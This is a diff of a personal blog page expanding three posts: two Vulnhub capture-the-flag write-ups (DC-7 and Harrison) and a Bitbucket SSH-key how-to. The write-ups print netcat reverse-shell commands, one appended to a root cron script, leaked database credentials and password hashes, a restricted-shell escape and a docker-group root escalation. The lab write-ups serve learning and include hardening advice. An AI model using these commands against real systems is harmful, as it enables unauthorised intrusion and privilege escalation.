@@ -85,14 +85,238 @@
 </header>
 
   
-  This is my report for DC7, by DCAU7. The first Vulnhub machine I ever did was DC2 (following along with a walkthrough), so this series is a personal favorite of mine. Without further adéu, let&rsquo;s jump in!
-We start by finding the IP with Netdiscover:
-Currently scanning: Finished! | Screen View: Unique Hosts 3 Captured ARP Req/Rep packets, from 3 hosts. Total size: 180 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname ----------------------------------------------------------------------------- 192.
-  
-  <p>
-    <a class="u-clickable" href="https://brigzzy.github.io/post/writup-dc7/">Read More…</a>
-  </p>
-  
+  <p>This is my report for <a href="https://www.vulnhub.com/entry/dc-7,356/">DC7</a>, by <a href="https://twitter.com/@DCAU7">DCAU7</a>.  The first Vulnhub machine I ever did was DC2 (following along with a walkthrough), so this series is a personal favorite of mine.  Without further adéu, let&rsquo;s jump in!</p>
+
+<p>We start by finding the IP with Netdiscover:</p>
+
+<pre><code>Currently scanning: Finished!   |   Screen View: Unique Hosts
+
+3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
+_____________________________________________________________________________
+  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+-----------------------------------------------------------------------------
+192.168.99.1    52:54:00:12:35:00      1      60  Unknown vendor
+192.168.99.2    52:54:00:12:35:00      1      60  Unknown vendor
+192.168.99.20   08:00:27:ed:e2:60      1      60  PCS Systemtechnik GmbH
+</code></pre>
+
+<p>Then we scan the target:</p>
+
+<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-03 16:00 PDT
+Nmap scan report for 192.168.99.20
+Host is up (0.00036s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey:
+|   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)
+|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f (ECDSA)
+|_  256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-generator: Drupal 8 (https://www.drupal.org)
+| http-robots.txt: 22 disallowed entries (15 shown)
+| /core/ /profiles/ /README.txt /web.config /admin/
+| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/
+| /user/password/ /user/login/ /user/logout/ /index.php/admin/
+|_/index.php/comment/reply/
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Welcome to DC-7 | D7
+MAC Address: 08:00:27:32:AD:22 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.36 ms 192.168.99.20
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.75 seconds
+</code></pre>
+
+<p>Port 80 is running a Drupal server.  Doing some quick manual enumeration doesn&rsquo;t turn up anything exciting, except for a possible username in the footer:</p>
+
+<p><img src="/dc7/drupal.png" alt="" /></p>
+
+<p>Doesn&rsquo;t work as a username on the site (as far as we can tell so far), but it looks like a twitter handle.  Sure enough:</p>
+
+<p><img src="/dc7/twitter.png" alt="" /></p>
+
+<p>Again, no interesting tweets, but there&rsquo;s a link to a github profile.  Going through the code, we find a username and password in the config.php file:</p>
+
+<p><img src="/dc7/github.png" alt="" /></p>
+
+<p>That username and password doesn&rsquo;t work on the Drupal site, but it does work for SSH.  Just like that, we&rsquo;ve got a user shell.</p>
+
+<p>In the user&rsquo;s home folder, we have a folder for backups, and an mbox file.  If we cat the mailbox, it looks like there&rsquo;s a cron job running every 15 minutes, that&rsquo;s backing up the site, and emailing the report to dc7user:</p>
+
+<pre><code>From root@dc-7 Thu Aug 29 17:00:22 2019
+Return-path: &lt;root@dc-7&gt;
+Envelope-to: root@dc-7
+Delivery-date: Thu, 29 Aug 2019 17:00:22 +1000
+Received: from root by dc-7 with local (Exim 4.89)
+	(envelope-from &lt;root@dc-7&gt;)
+	id 1i3EPu-0000CV-5C
+	for root@dc-7; Thu, 29 Aug 2019 17:00:22 +1000
+From: root@dc-7 (Cron Daemon)
+To: root@dc-7
+Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1i3EPu-0000CV-5C@dc-7&gt;
+Date: Thu, 29 Aug 2019 17:00:22 +1000
+
+Database dump saved to /home/dc7user/backups/website.sql               [success]
+gpg: symmetric encryption of '/home/dc7user/backups/website.tar.gz' failed: File exists
+gpg: symmetric encryption of '/home/dc7user/backups/website.sql' failed: File exists
+</code></pre>
+
+<p>Couple interesting things here:</p>
+
+<ol>
+<li>The script is living in /opt/scripts/backups.sh, and</li>
+<li>it&rsquo;s running as root.<br /></li>
+</ol>
+
+<p>I tried to edit it or append to it, but got permission errors.  Looks like it&rsquo;s owned by the www-data user.  I did some more checks on the user account, but didn&rsquo;t find anything super promising.  Guess we need to take another look at Drupal.</p>
+
+<p>I ran a tool called Droopescan to see if it turned up anything, but didn&rsquo;t get anything helpful:</p>
+
+<pre><code>[+] Site identified as drupal.
+[+] Themes found:
+    startupgrowth_lite http://192.168.99.20/themes/startupgrowth_lite/
+        http://192.168.99.20/themes/startupgrowth_lite/LICENSE.txt
+
+[+] Possible interesting urls found:
+    Default admin - http://192.168.99.20/user/login
+
+[+] Possible version(s):
+    8.7.0
+    8.7.0-alpha1
+    8.7.0-alpha2
+    8.7.0-beta1
+    8.7.0-beta2
+    8.7.0-rc1
+    8.7.1
+    8.7.2
+    8.7.3
+
+[+] No plugins found.
+</code></pre>
+
+<p>I also hopped back on the box as dc7user and took a closer look through the Drupal install.  I managed to get the db creds (which were different than the ones we found in Github), and checked the db for clues.  Nothing too interesting, but we did get the list of valid users on the site:</p>
+
+<pre><code>$databases['default']['default'] = array (
+  'database' =&gt; 'd7db',
+  'username' =&gt; 'db7user',
+  'password' =&gt; 'yNv3Po00',
+  'prefix' =&gt; '',
+  'host' =&gt; 'localhost',
+  'port' =&gt; '',
+  'namespace' =&gt; 'Drupal\\Core\\Database\\Driver\\mysql',
+  'driver' =&gt; 'mysql',
+);
+</code></pre>
+
+<pre><code>MariaDB [d7db]&gt; select * from users_field_data;
++-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+
+| uid | langcode | preferred_langcode | preferred_admin_langcode | name    | pass                                                    | mail              | timezone            | status | created    | changed    | access     | login      | init              | default_langcode |
++-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+
+|   0 | en       | en                 | NULL                     |         | NULL                                                    | NULL              |                     |      0 | 1567054076 | 1567054076 |          0 |          0 | NULL              |                1 |
+|   1 | en       | en                 | NULL                     | admin   | $S$E8joY5kexnKYRHEw92AtUVWXDTKPV/kBNnS2nYjI/xOwb.xV7TQS | admin@example.com | Australia/Melbourne |      1 | 1567054076 | 1567555661 | 1567556494 | 1567555735 | admin@example.com |                1 |
+|   2 | en       | en                 | en                       | dc7user | $S$EKe0kuKQvFhgFnEYMpq.mRtbl/TQ5FmEjCDxbu0HIHaO0/U.YFjI | dc7user@blah.com  | Australia/Brisbane  |      1 | 1567057938 | 1567057938 |          0 |          0 | dc7user@blah.com  |                1 |
++-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+
+3 rows in set (0.00 sec)
+</code></pre>
+
+<p>Finally, I noticed in dc7user&rsquo;s home directory, a folder called <code>.drush</code>.</p>
+
+<p><a href="https://www.drush.org/">Drush</a> is a command line shell for Drupal.  I spent quite a bit of time reading about it, before learning that it&rsquo;s sensitive about where you run it from.  When I ran it from the www root folder, I was able to reset the admin user&rsquo;s password:</p>
+
+<pre><code>dc7user@dc-7:/var/www/html$ drush user-password admin --password=&quot;test&quot;
+Changed password for admin
+[success]
+</code></pre>
+
+<p>And just like that we&rsquo;re in!</p>
+
+<p>Now that we have a Drupal admin account, we need to use it to get a shell.  Remember that script that was running as root?  I&rsquo;m not super proud of my solution, but I found a plugin for Drupal called <a href="https://www.drupal.org/project/shell">shell</a>, which does exactly what you think it does.  From there, it was a pretty simple matter of appending a reverse shell to the backup script that we found that runs as root:</p>
+
+<p><img src="/dc7/webshell.png" alt="" /></p>
+
+<pre><code>Listener:
+nc -lvp 4444
+
+Connector:
+nc 192.168.99.14 4444 -e /bin/bash
+</code></pre>
+
+<p>Once we use the web shell to get a proper reverse shell, we echo another reverse shell into the script (we probably could have just used the web shell for this, but what can I say, I prefer a proper terminal):</p>
+
+<pre><code>echo &quot;nc 192.168.99.14 4445 -e /bin/bash&quot; &gt;&gt; /opt/scripts/backups.sh
+</code></pre>
+
+<p>And a root shell:</p>
+
+<pre><code>~ ᐅ nc -lvp 4445
+listening on [any] 4445 ...
+192.168.99.20: inverse host lookup failed: Unknown host
+connect to [192.168.99.14] from (UNKNOWN) [192.168.99.20] 48518
+
+whoami
+root
+cd /root
+ls
+theflag.txt
+cat theflag.txt
+
+
+
+
+888       888          888 888      8888888b.                             888 888 888 888
+888   o   888          888 888      888  &quot;Y88b                            888 888 888 888
+888  d8b  888          888 888      888    888                            888 888 888 888
+888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888
+888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888
+88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P
+8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  
+888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888
+
+
+Congratulations!!!
+
+Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and all those who have taken the time to complete these little
+challenges.
+
+I'm sending out an especially big thanks to:
+
+@4nqr34z
+@D4mianWayne
+@0xmzfr
+@theart42
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+</code></pre>
+
+<p>So now that we know how to compromise this box, how could this have been avoided?</p>
+
+<ol>
+<li>Don&rsquo;t commit passwords to a git repo.  Use a secret manager, like <a href="https://www.vaultproject.io/">Hashicorp Vault</a>, or an environment variable file (not stored in SC) to store sensitive information.  You could also have a solution in place that rejects commits that include sensitive information.</li>
+<li>Use ACLs or firewalls that only allow SSH connections from trusted networks.</li>
+<li>We found the MySQL credentials pretty easily as the dc7 user.  That user probably doesn&rsquo;t need to be able to read files in the www directory.  Since Drush provides the ability to reset passwords, and other neferious things on the site, that utility should also be restricted to a privileged user.</li>
+</ol>
+
+<p>Any other suggestions?  Thoughts about this writeup?  <a href="/about/">Let me know!</a></p>
+
   
   
 
@@ -117,13 +341,41 @@ Currently scanning: Finished! | Screen View: Unique Hosts 3 Captured ARP Req/Rep
 </header>
 
   
-  If you use Bitbucket in multiple environments (for example home, and work), you may need to configure multiple SSH keys. This is because once a key has been added to bitbucket (be it a work account, or a personal one), that key can no longer be used in any other Bitbucket account.
-The problem is that when you try and clone a repo via SSH, you may get a permission denied error when you connect to bitbucket.
-  
-  <p>
-    <a class="u-clickable" href="https://brigzzy.github.io/post/configuring-bitbucket-ssh-multiple-keys/">Read More…</a>
-  </p>
-  
+  <p>If you use Bitbucket in multiple environments (for example home, and work), you may need to configure multiple SSH keys.  This is because once a key has been added to bitbucket (be it a work account, or a personal one), that key can no longer be used in any other Bitbucket account.</p>
+
+<p>The problem is that when you try and clone a repo via SSH, you may get a permission denied error when you connect to bitbucket.org with a valid key, but not a key that&rsquo;s valid for the repo you&rsquo;re trying to work with.</p>
+
+<p>To get around this, you can make an ssh config file that matches the host, username, and key you want to use.</p>
+
+<ol>
+<li><p>If you haven&rsquo;t already, generate your new SSH key that you want to use with Bitbucket:</p>
+
+<pre><code>ssh-keygen -o -a 100 -t ed25519 -f ~/.ssh/id_bitbucket_personal
+</code></pre></li>
+
+<li><p>Add the public key to your Bitbucket account</p></li>
+
+<li><p>Create a <code>~/.ssh/config</code> file</p></li>
+
+<li><p>Add the following lines, substituting your values</p>
+
+<pre><code>Host bitbucket.org
+User &lt;someone&gt;
+Hostname bitbucket.org
+IdentitiesOnly yes
+IdentityFile ~/.ssh/id_bitbucket_personal
+</code></pre>
+
+<blockquote>
+<p>Note that you can use any name in the User field.  You probably don&rsquo;t want to use git, if you&rsquo;re using that as your identity for another account.</p>
+</blockquote></li>
+
+<li><p>Now you can clone the repo from bitbucket.org, replacing the username git with the user you&rsquo;ve configured in the ssh config file.</p>
+
+<pre><code>git clone someone@bitbucket.org:myorg/repo.git
+</code></pre></li>
+</ol>
+
   
   
 
@@ -148,14 +400,343 @@ The problem is that when you try and clone a repo via SSH, you may get a permiss
 </header>
 
   
-  Welcome to my blog! This is my first write up on a vulnhub VM. The VM in question is by Daniel Solstad, and is hosted by vulnhub.com.
-Summary:  Scan the network Scan the host Check out SMB Break out of a restricted shell Enumerate the host Get the root flag  Scan the Network: First we use netdiscover to see where the vulnerable system is.
-netdiscover -r 192.168.99.0/24  Currently scanning: Finished!
   
-  <p>
-    <a class="u-clickable" href="https://brigzzy.github.io/post/writup-sp-harrison/">Read More…</a>
-  </p>
-  
+
+<p>Welcome to my blog!  This is my first write up on a vulnhub VM.  The VM in question is by <a href="https://dsolstad.com/">Daniel Solstad</a>, and is hosted by <a href="vulnhub.com">vulnhub.com</a>.</p>
+
+<h3 id="summary">Summary:</h3>
+
+<ul>
+<li>Scan the network</li>
+<li>Scan the host</li>
+<li>Check out SMB</li>
+<li>Break out of a restricted shell</li>
+<li>Enumerate the host</li>
+<li>Get the root flag</li>
+</ul>
+
+<h4 id="scan-the-network">Scan the Network:</h4>
+
+<p>First we use netdiscover to see where the vulnerable system is.</p>
+
+<pre><code>netdiscover -r 192.168.99.0/24
+</code></pre>
+
+<pre><code>Currently scanning: Finished! | Screen View: Unique Hosts
+
+4 Captured ARP Req/Rep packets, from 4 hosts. Total size: 240
+_____________________________________________________________________________
+IP At MAC Address Count Len MAC Vendor / Hostname
+-----------------------------------------------------------------------------
+192.168.99.1    52:54:00:12:35:00 1 60 Unknown vendor
+192.168.99.2    52:54:00:12:35:00 1 60 Unknown vendor
+192.168.99.3    08:00:27:dc:37:c5 1 60 PCS Systemtechnik GmbH
+192.168.99.23   08:00:27:45:0b:aa 1 60 PCS Systemtechnik GmbH
+</code></pre>
+
+<p>Boom, we have out host!</p>
+
+<h4 id="scan-the-host">Scan the Host:</h4>
+
+<p>Now we&rsquo;re going to fire up nmap, and scan the host.</p>
+
+<pre><code>nmap -T4 -A -p- 192.168.99.23
+</code></pre>
+
+<pre><code>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-24 16:51 PDT
+Nmap scan report for 192.168.99.23
+Host is up (0.00059s latency).
+Not shown: 65533 closed ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+| 2048 5b:87:f1:fe:67:8f:a6:ba:8b:75:3c:11:34:3d:b6:b8 (RSA)
+| 256 93:87:7e:2e:5e:4e:ce:71:56:a1:1c:6b:fc:1f:6e:55 (ECDSA)
+|_ 256 c0:14:c0:24:e8:a8:7e:d4:cd:a6:42:25:f3:48:47:94 (ED25519)
+445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+MAC Address: 08:00:27:45:0B:AA (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: Host: HARRISON; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 5s, deviation: 1s, median: 4s
+| smb-os-discovery:
+| OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+| Computer name: harrison
+| NetBIOS computer name: HARRISON\x00
+| Domain name: \x00
+| FQDN: harrison
+|_ System time: 2019-05-24T23:52:14+00:00
+| smb-security-mode:
+| account_used: guest
+| authentication_level: user
+| challenge_response: supported
+|_ message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+| 2.02:
+|_ Message signing enabled but not required
+| smb2-time:
+| date: 2019-05-24 16:52:15
+|_ start_date: N/A
+
+TRACEROUTE
+HOP RTT ADDRESS
+1 0.59 ms 192.168.99.23
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.77 seconds
+</code></pre>
+
+<p>From the scan, we can see that port 445 (SMB) is open.  SMB usually indicates file shares.  Let&rsquo;s do another scan and see if we can get some more information.  Nmap has a great script for hunting for SMB shares:</p>
+
+<pre><code>nmap --script=smb-enum-shares 192.168.99.23
+</code></pre>
+
+<pre><code>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-24 16:56 PDT
+Nmap scan report for 192.168.99.23
+Host is up (0.00015s latency).
+Not shown: 998 closed ports
+PORT STATE SERVICE
+22/tcp open ssh
+445/tcp open microsoft-ds
+MAC Address: 08:00:27:45:0B:AA (Oracle VirtualBox virtual NIC)
+
+Host script results:
+| smb-enum-shares:
+| account_used: &lt;blank&gt;
+| \\192.168.99.23\IPC$:
+| Type: STYPE_IPC_HIDDEN
+| Comment: IPC Service (Samba 4.7.6-Ubuntu)
+| Users: 1
+| Max Users: &lt;unlimited&gt;
+| Path: C:\tmp
+| Anonymous access: READ/WRITE
+| \\192.168.99.23\Private:
+| Type: STYPE_DISKTREE
+| Comment:
+| Users: 0
+| Max Users: &lt;unlimited&gt;
+| Path: C:\home\harrison
+|_ Anonymous access: READ/WRITE
+
+Nmap done: 1 IP address (1 host up) scanned in 4.76 seconds
+</code></pre>
+
+<p>Well, well, well, looks like Harrison&rsquo;s home directory is wide open!  Let&rsquo;s connect and see what&rsquo;s in there.</p>
+
+<h4 id="check-out-smb">Check out SMB:</h4>
+
+<p>Since anonymous access is enabled, we can just use smbclient to connect to the share and poke around:</p>
+
+<pre><code>smbclient -N //192.168.99.23/Private
+</code></pre>
+
+<pre><code>root@kali:~# smbclient -N //192.168.99.23/Private
+Anonymous login successful
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt;
+</code></pre>
+
+<p>Once we&rsquo;re in, we can see that we are indeed in a home directory.  Let&rsquo;s grab some interesting files:</p>
+
+<pre><code>smb: \&gt; ls
+. D 0 Thu Apr 18 09:55:51 2019
+.. D 0 Thu Apr 18 09:12:55 2019
+.bash_logout H 220 Wed Apr 4 11:30:26 2018
+.profile H 807 Wed Apr 4 11:30:26 2018
+.bashrc H 3771 Wed Apr 4 11:30:26 2018
+silly_cats D 0 Thu Apr 18 09:55:51 2019
+.ssh DH 0 Thu Apr 18 09:42:57 2019
+flag.txt N 32 Thu Apr 18 09:14:18 2019
+
+32894736 blocks of size 1024. 27324024 blocks available
+smb: \&gt; get flag.txt
+getting file \flag.txt of size 32 as flag.txt (3.1 KiloBytes/sec) (average 3.1 KiloBytes/sec)
+smb: \&gt; get .ssh\
+.ssh\authorized_keys .ssh\id_rsa .ssh\id_rsa.pub
+smb: \&gt; get .ssh\id_rsa
+getting file \.ssh\id_rsa of size 1679 as .ssh\id_rsa (164.0 KiloBytes/sec) (average 83.5 KiloBytes/sec)
+</code></pre>
+
+<p>We have a user flag!  Let&rsquo;s download it and check it out.  We also have a private key in the .ssh folder.  We can probably use this to log into the system via SSH.</p>
+
+<p>First we&rsquo;ll check out the flag:</p>
+
+<pre><code>cat flag.txt
+</code></pre>
+
+<pre><code>root@kali:~# cat flag.txt
+It's not going to be that easy.
+</code></pre>
+
+<p>Wouldn&rsquo;t be much of a prison if we could just grab the flag off an open file share, would it?  Let&rsquo;s SSH in (after fixing the permissions on the private key):</p>
+
+<pre><code>chmod 600 id_rsa &amp;&amp; ssh -i id_rsa harrison@192.168.99.23
+</code></pre>
+
+<pre><code>root@kali:~# chmod 600 id_rsa
+root@kali:~# ssh -i id_rsa harrison@192.168.99.23
+The authenticity of host '192.168.99.23 (192.168.99.23)' can't be established.
+ECDSA key fingerprint is SHA256:4dYpYoutbqxX67U1GWar5n+R7JcfOY9yGk2HJbI1mKs.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.99.23' (ECDSA) to the list of known hosts.
+
+Welcome to Harrison. Enjoy your shell.
+
+Type '?' or 'help' to get the list of allowed commands
+harrison:~$
+</code></pre>
+
+<p>Boom, we got a user shell!</p>
+
+<h4 id="break-out-of-a-restricted-shell">Break out of a restricted shell:</h4>
+
+<p>Looks like the shell we have is pretty locked down:</p>
+
+<pre><code>harrison:~$ ls
+flag.txt silly_cats
+harrison:~$ cd /
+*** forbidden path: /
+harrison:~$ sudo -l
+*** forbidden sudo command: sudo -l
+harrison:~$ ?
+cd clear echo exit help history ll lpath ls lsudo
+</code></pre>
+
+<p>This is our toolkit.  Not much to work with.  In order to break out, we&rsquo;ll need to figure out which restricted shell we&rsquo;re in.</p>
+
+<pre><code>harrison:~$ echo $SHELL
+*** forbidden path: /usr/bin/lshell
+</code></pre>
+
+<p>OK, so it&rsquo;s something called <a href="https://github.com/ghantoos/lshell">lshell</a>.  To escape the shell, I did some searching, and found a bug on the lshell bugtracker that we can use to get into a real shell:</p>
+
+<pre><code>harrison:~$ echo &amp;&amp; 'bash'
+harrison@harrison:~$
+</code></pre>
+
+<h4 id="enumerate-the-host">Enumerate the Host:</h4>
+
+<p>Now that we have a real shell, let&rsquo;s do some manual host enumeration. Just for fun, we check /root, and find that we can read the files in it!</p>
+
+<pre><code>harrison@harrison:~$ ls /root
+flag.txt
+harrison@harrison:~$ cat /root/flag.txt
+Nope. No flags here. Where do you think you are?
+</code></pre>
+
+<p>Well, hmm.  Looks like the flag isn&rsquo;t here.  But the name of the game is to read the root flag, right?  Let&rsquo;s keep looking.  We can poke at the host by hand, but I like using this LinEnum script:</p>
+
+<pre><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh &amp;&amp; chmod +x LinEnum.sh &amp;&amp; ./LinEnum.sh
+</code></pre>
+
+<pre><code>harrison@harrison:~$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+--2019-05-25 00:35:05-- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.40.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.40.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 45639 (45K) [text/plain]
+Saving to: 'LinEnum.sh'
+
+LinEnum.sh 100%[========================================&gt;] 44.57K --.-KB/s in 0.06s
+
+2019-05-25 00:35:06 (740 KB/s) - 'LinEnum.sh' saved [45639/45639]
+
+harrison@harrison:~$ chmod +x LinEnum.sh
+harrison@harrison:~$ ./LinEnum.sh
+</code></pre>
+
+<p>The output from this command is pretty long, and you should definitely read through it all, so you know what it&rsquo;s capable of, but in the interest of shortening the post, I&rsquo;ll show you what caught my eye:</p>
+
+<pre><code>[+] Looks like we're in a Docker container:
+12:blkio:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+11:perf_event:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+9:memory:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+8:devices:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+7:freezer:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+6:net_cls,net_prio:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+5:cpuset:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+4:hugetlb:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+3:pids:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+2:cpu,cpuacct:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+1:name=systemd:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+-rwxr-xr-x 1 root root 0 May 24 23:39 /.dockerenv
+
+[+] We're a member of the (docker) group - could possibly misuse these rights!
+uid=1000(harrison) gid=1000(harrison) groups=1000(harrison),27(sudo),999(docker)
+</code></pre>
+
+<p>Jackpot!  We&rsquo;re in a Docker container.  Even better, we&rsquo;re a member of the docker group.  That means we can run docker ourselves.  Without getting too technical, when you run a docker container, unless you tell it not to, it&rsquo;ll run as root.  If you run a container as root (Which you&rsquo;re allowed to do as a member of the Docker group), and mount the underlying file system, you basically have root on that system!  Pretty neat, huh?</p>
+
+<p>Let&rsquo;s see how it&rsquo;s done</p>
+
+<h4 id="get-the-root-flag">Get the Root Flag:</h4>
+
+<p>To misuse docker, we need to run it.  Alas:</p>
+
+<pre><code>harrison@harrison:~$ docker
+bash: docker: command not found
+harrison@harrison:~$ which docker
+harrison@harrison:~$
+</code></pre>
+
+<p>Docker isn&rsquo;t installed in the container.  Installing it would be tricky, since we don&rsquo;t have sudo, or the root password.  Good news is that Docker offers the binaries for download, without needing to install them:</p>
+
+<pre><code>wget https://download.docker.com/linux/static/stable/x86_64/docker-18.03.0-ce.tgz &amp;&amp; tar zxf docker-18.03.0-ce.tgz &amp;&amp; cd docker &amp;&amp; ./docker
+</code></pre>
+
+<pre><code>harrison@harrison:~$ wget https://download.docker.com/linux/static/stable/x86_64/docker-18.03.0-ce.tgz
+--2019-05-25 00:50:07-- https://download.docker.com/linux/static/stable/x86_64/docker-18.03.0-ce.tgz
+Resolving download.docker.com (download.docker.com)... 13.224.2.97, 13.224.2.123, 13.224.2.101, ...
+Connecting to download.docker.com (download.docker.com)|13.224.2.97|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 38752537 (37M) [application/x-tar]
+Saving to: 'docker-18.03.0-ce.tgz'
+
+docker-18.03.0-ce.tgz 100%[============================================================================================================&gt;] 36.96M 13.1MB/s in 2.8s
+
+2019-05-25 00:50:10 (13.1 MB/s) - 'docker-18.03.0-ce.tgz' saved [38752537/38752537]
+
+harrison@harrison:~$ tar zxf docker-18.03.0-ce.tgz
+harrison@harrison:~$ ls
+LinEnum.sh docker docker-18.03.0-ce.tgz flag.txt silly_cats
+harrison@harrison:~$ cd docker
+harrison@harrison:~/docker$ ls
+docker docker-containerd docker-containerd-ctr docker-containerd-shim docker-init docker-proxy docker-runc dockerd
+harrison@harrison:~/docker$ ./docker
+</code></pre>
+
+<p>Now let&rsquo;s run the container.  We&rsquo;re going to mount the root filesystem for the underlying host at the /home directory in the new container:</p>
+
+<pre><code>./docker run -it -v /:/home/ ubuntu bash
+</code></pre>
+
+<pre><code>harrison@harrison:~/docker$ ./docker run -it -v /:/home/ ubuntu bash
+root@bec2ede58b0f:/#
+</code></pre>
+
+<p>Note that the prompt changes.  We&rsquo;re now the root user in this new container.  Let&rsquo;s take a look at the home directory:</p>
+
+<pre><code>cat /home/root/flag.txt
+</code></pre>
+
+<pre><code>root@bec2ede58b0f:/# ls # This is the container file system
+bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
+root@bec2ede58b0f:/# cd /home
+root@bec2ede58b0f:/home# ls # This is the file system on the host!
+bin boot dev etc home initrd.img initrd.img.old lib lib64 lost+found media mnt opt proc root run sbin srv swapfile sys tmp usr var vmlinuz vmlinuz.old
+root@bec2ede58b0f:/home# cat root/flag.txt
+Do you think you are out?
+
+Just kidding, here is your flag: 1xcDF933mce
+</code></pre>
+
+<p>And that&rsquo;s that!  I hope you enjoyed reading this!  I&rsquo;m certainly not and expert at pentesting, but I&rsquo;m going to try and continue doing writeups of boxes that I&rsquo;m successful at breaking into.</p>
+
   
   
 
